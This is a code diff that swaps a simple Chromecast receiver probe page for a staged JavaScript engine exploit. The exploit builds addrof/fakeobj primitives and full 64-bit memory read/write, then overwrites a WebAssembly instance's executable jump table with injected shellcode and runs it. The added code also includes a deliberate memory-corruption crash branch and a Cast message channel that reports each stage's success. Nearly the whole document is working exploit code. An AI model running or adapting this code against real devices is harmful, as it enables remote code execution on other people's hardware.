+  var instAddr = addrof(inst) >>> 0;
+  var jtOff = archIs64 ? CFG.JT_OFF_A64 : CFG.JT_OFF_A32;
+  var instBase = instAddr & ~1; // untag
+  // cage read of the instance fields via the retargeted buffer: the instance lives in
+  // the cage; the backing store can point into it.
+  var ms = read64(instBase + CFG.MS_OFF, 0);            // memory_start sanity (0x0c)
+  var jt = read64(instBase + jtOff, 0);                 // jump_table_start (RWX)
+  report('stage6', true, 'inst=0x' + instAddr.toString(16) + ' memory_start=0x' +
+    ms[1].toString(16) + ':' + ms[0].toString(16) + ' jump_table_start=0x' +
+    jt[1].toString(16) + ':' + jt[0].toString(16));
+  if ((jt[0] === 0 && jt[1] === 0)) { warn('stage6', 'jump_table_start read as 0 — offset wrong for this build'); return false; }
+  var sc = archIs64 ? SHELLCODE_A64 : SHELLCODE_A32;
+  if (!sc) { warn('stage6', 'shellcode blob not injected'); return false; }
+  for (var i = 0; i < sc.length; i += 8) {
+    var b0 = sc[i] | (sc[i+1] << 8) | (sc[i+2] << 16) | ((sc[i+3] || 0) << 24);
+    var b1 = (sc[i+4] || 0) | ((sc[i+5] || 0) << 8) | ((sc[i+6] || 0) << 16) | ((sc[i+7] || 0) << 24);
+    write64(jt[0] + i, jt[1], b0 >>> 0, b1 >>> 0);
+  }
+  report('stage6', true, 'shellcode written at jump table; invoking exported main()');
+  try { wfn(); } catch (e) { warn('stage6', 'main() threw after overwrite: ' + e); return false; }
+  return true;
 }
-context.addCustomMessageListener(NS, (ev)=>{ report(ev.senderId); });
-context.addEventListener(cast.framework.system.EventType.READY, ()=>{ report(undefined); });
-const opts = new cast.framework.CastReceiverOptions();
-opts.disableIdleTimeout = true;
-opts.customNamespaces = { [NS]: cast.framework.system.MessageType.JSON };
-context.start(opts);
-log('engine-probe v2: started, waiting for READY…');
-</script>
-</body>
-</html>
+
+// ---------------- crash-confirm branch (OFF by default) ----------------
+function crashConfirm() {
+  // Deliberately corrupts live structures so the renderer dies unambiguously: the
+  // oracle then classifies B (Cast session drop + receiver reload) with certainty.
+  // Enabled ONLY by sender confirmation over the message channel; never auto-run.
+  try {
+    setBackingStore(0x41414141, 0x41414141, 0x1000);
+    rwv.setUint32(0, 0x41414141, true);
+  } catch (e) { /* dying anyway */ }
+}
+
+// ---------------- sender command channel (reporting + confirm gating) ----------------
+function initReceiverBus() {
+  try {
+    if (typeof window === 'undefined' || !window.cast || !window.cast.receiver) return;
+    var mgr = cast.receiver.CastReceiverManager.getInstance();
+    var bus = mgr.getCastMessageBus(CFG.REPORT_NS);
+    bus.onMessage = function (e) {
+      LAST_SENDER = e.senderId;
+      try {
+        var cmd = JSON.parse(e.data);
+        if (cmd && cmd.type === 'confirm-crash' && CFG.CRASH_CONFIRM) crashConfirm();
+        if (cmd && cmd.type === 'ping') bus.send(LAST_SENDER, JSON.stringify({ type: 'pong', stages: STAGE_OK }));
+      } catch (err) { warn('bus', 'bad sender message'); }
+    };
+    mgr.start();
+  } catch (e) { /* d8 desk run — no receiver bus */ }
+}
+
+// ---------------- main ----------------
+function main38003() {
+  initReceiverBus();
+  try { if (!stage0()) return; } catch (e0) { warn('stage0', 'threw: ' + e0); return; }
+  var hole;
+  try { hole = stage1(); } catch (e1) { warn('stage1', 'threw: ' + e1); return; }
+  var amp;
+  try { amp = amplify(hole); } catch (e2) { warn('stage2', 'amplify threw: ' + e2); return; }
+  if (corrupted.length === 4) {
+    warn('stage2', 'jzx plant keys did not smash the window — trying hash-controlled battery');
+    try { if (!tryKeyBattery(hole, amp.MK)) { warn('stage2', 'battery exhausted; window intact — stopping safely'); return; } } catch (e2b) { warn('stage2', 'battery threw: ' + e2b); return; }
+  } else {
+    report('stage2', true, 'window smashed by plant keys: length=' + corrupted.length);
+  }
+  try { if (!scanWindow()) return; } catch (e3) { warn('stage3', 'scan threw: ' + e3); return; }
+  var probe = {};
+  var aProbe = addrof(probe);
+  report('stage4', true, 'addrof({})=0x' + (aProbe >>> 0).toString(16));
+  if ((aProbe & 1) !== 1) { warn('stage4', 'addrof result not tagged — aliasing unreliable'); return; }
+  var back = fakeobj(aProbe);
+  if (back !== probe) { warn('stage4', 'fakeobj roundtrip mismatch'); return; }
+  report('stage4', true, 'fakeobj roundtrip OK');
+  try { if (!findBackingStoreSlot()) return; } catch (e5) { warn('stage5', 'AB scan threw: ' + e5); return; }
+  // sanity: retarget to itself and read back the marker we plant in the buffer
+  var bs0 = lo32(corrupted[AB_BS_SLOT]), bs0h = hi32(corrupted[AB_BS_SLOT]);
+  rwv.setUint32(0, 0xC0FFEE42, true);
+  var r = read64(bs0, bs0h);
+  if (r[0] !== 0xC0FFEE42) { warn('stage5', 'self-read sanity failed: 0x' + r[0].toString(16)); return; }
+  report('stage5', true, 'full 64-bit R/W validated (self-read 0xC0FFEE42)');
+  var archIs64 = CFG.IS64;
+  if (archIs64 === null) {
+    // auto-detect: instance field read at the aarch64 offset should look like a pointer
+    var inst0 = addrof(new WebAssembly.Instance(new WebAssembly.Module(WASM_BYTES), {})) & ~1;
+    var probe64 = read64(inst0 + CFG.JT_OFF_A64, 0);
+    archIs64 = !(probe64[0] === 0 && probe64[1] === 0) || (probe64[1] & 0xffff0000) !== 0;
+    report('stage6', true, 'arch auto-detect: is64=' + archIs64 + ' (probe 0x' + probe64[1].toString(16) + ':' + probe64[0].toString(16) + ')');
+  }
+  try { if (!stage6(archIs64)) return; } catch (e6) { warn('stage6', 'threw: ' + e6); return; }
+  report('done', true, 'all stages OK; beacon handed off to shellcode');
+  if (CFG.CRASH_CONFIRM) crashConfirm();
+}
+
+if (CFG.AUTO) {
+  try { main38003(); } catch (eTop) { warn('main', 'uncaught: ' + eTop); }
+} else {
+  report('idle', true, 'AUTO=false — call main38003() manually');
+}
+}catch(eOuter){try{var bE=cast.receiver.CastReceiverManager.getInstance().getCastMessageBus("urn:x-cast:net.max38003.stage");bE.broadcast(JSON.stringify({stage:"top-level",ok:false,msg:String(eOuter).slice(0,300)}));}catch(eR){}}
+</script></body></html>
